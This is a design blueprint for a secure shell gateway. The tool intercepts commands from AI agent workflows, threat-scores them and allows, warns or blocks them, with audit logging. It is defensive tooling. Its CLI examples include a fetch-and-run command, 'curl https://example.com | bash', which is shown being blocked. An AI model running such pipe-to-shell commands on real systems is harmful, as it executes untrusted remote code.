# BLUEPRINT: op-fortress
## Tool: `secure-shell-gateway`

> Foundation Operations — Operation Fortress  
> *"Every command goes through the gate. Nothing bypasses the wall."*

---

## Mission

A security wrapper that intercepts shell commands before execution, runs them through the bash parser + AST analyzer + permission rule engine, shows a threat assessment, and either blocks, warns, or passes them through. Deployable as a team-wide shell security layer — a drop-in replacement for unrestricted shell access in AI agent workflows.

---

## Component Tools Integrated

| Module | Source Tool | Role |
|--------|------------|------|
| Command Analysis | `op-bunker` (bash-inspector) | Parse + threat-score every command |
| Permission Check | `op-clearance` (permission-auditor) | Apply configured rule set |
| Audit Log | `op-archive` (session-replay) | Log all decisions to JSONL |

---

## Source Files from openclaude (extraction targets)

| File | Role |
|------|------|
| `src/utils/bash/bashParser.ts` | Bash AST parser |
| `src/utils/bash/ast.ts` | AST types |
| `src/tools/BashTool/bashSecurity.ts` | Threat classification |
| `src/utils/permissions/permissions.ts` | Permission rule engine |
| `src/utils/permissions/shellRuleMatching.ts` | Rule matching |
| `src/utils/permissions/permissionExplainer.ts` | Plain-English explanations |
| `src/utils/permissions/bashClassifier.ts` | Risk tier classification |
| `src/utils/sessionStorage.ts` | Audit log writing |

---

## Architecture

```
secure-shell-gateway/
├── src/
│   ├── cli.ts                  # Entry: run as shell wrapper or standalone
│   ├── gateway/
│   │   ├── interceptor.ts      # Hook: receive command before exec
│   │   ├── pipeline.ts         # Run: parse → threat → permission → decide
│   │   ├── decision.ts         # ALLOW / WARN / BLOCK + reason
│   │   └── executor.ts         # Actually run the command if allowed
│   ├── analysis/
│   │   ├── parser.ts           # bashParser.ts wrapper
│   │   ├── threatScorer.ts     # Risk scoring from op-bunker
│   │   └── patternMatcher.ts   # Dangerous pattern registry
│   ├── permissions/
│   │   ├── ruleLoader.ts       # Load permission config
│   │   ├── ruleMatcher.ts      # shellRuleMatching.ts
│   │   └── explainer.ts        # permissionExplainer.ts
│   ├── audit/
│   │   ├── auditLogger.ts      # JSONL audit log writer
│   │   └── auditViewer.ts      # Read/display audit trail
│   ├── ui/
│   │   ├── WarningBanner.tsx   # Ink: show threat assessment
│   │   ├── BlockedBanner.tsx   # Show block reason with suggestion
│   │   └── ConfirmPrompt.tsx   # Interactive: approve flagged command
│   └── types.ts
├── package.json
├── tsconfig.json
└── README.md
```

### Decision Pipeline

```
Command received
     │
     ▼
bashParser.ts ──► AST
     │
     ▼
threatScorer.ts ──► risk score (0-100)
     │
     ├── score ≥ 90 ──► BLOCK (no override)
     │
     ├── score 60-89 ──► WARN + require confirmation
     │
     ▼
ruleMatcher.ts ──► check against allow/deny rules
     │
     ├── explicit DENY ──► BLOCK
     ├── explicit ALLOW ──► ALLOW (skip score)
     │
     ▼
decision.ts ──► final verdict with reason
     │
     ├── ALLOW ──► executor.ts (run command)
     ├── WARN  ──► confirmPrompt.tsx → user approval
     └── BLOCK ──► blockBanner.tsx + audit log
```

---

## Build Plan

### Phase 1 — Analysis Pipeline
- [ ] Integrate bash parser from op-bunker
- [ ] Threat scoring engine
- [ ] Permission rule loader (supports `.sgw-rules.json`)

### Phase 2 — Decision Engine
- [ ] Three-tier decision system: ALLOW / WARN / BLOCK
- [ ] Score thresholds configurable per deployment
- [ ] Explicit rule overrides (whitelist/blacklist)

### Phase 3 — Shell Integration
- [ ] Drop-in `bash` wrapper: `secure-shell-gateway exec -- <command>`
- [ ] `BASH_ENV` hook for transparent interception
- [ ] Agent tool adapter: replace `BashTool` execution with gateway

### Phase 4 — Audit Logging
- [ ] JSONL audit trail: timestamp, command, score, decision, user
- [ ] `sgw audit --tail` live tail of decisions
- [ ] `sgw audit --report` daily/weekly security summary

---

## CLI Interface

```bash
# Intercept a single command
secure-shell-gateway exec "curl https://example.com | bash"
# → BLOCKED: Remote code execution pattern (score: 94/100)

# Interactive mode: approve flagged commands
secure-shell-gateway exec --interactive "npm publish"

# Run as shell replacement
SHELL=secure-shell-gateway openclaude

# Apply a specific rule set
secure-shell-gateway exec --rules .sgw-rules.json "git push"

# View audit log
secure-shell-gateway audit --tail
secure-shell-gateway audit --report --since today
```

---

*Branch: `foundation/op-fortress` | Parent repo: FoundationOperations/openclaude*
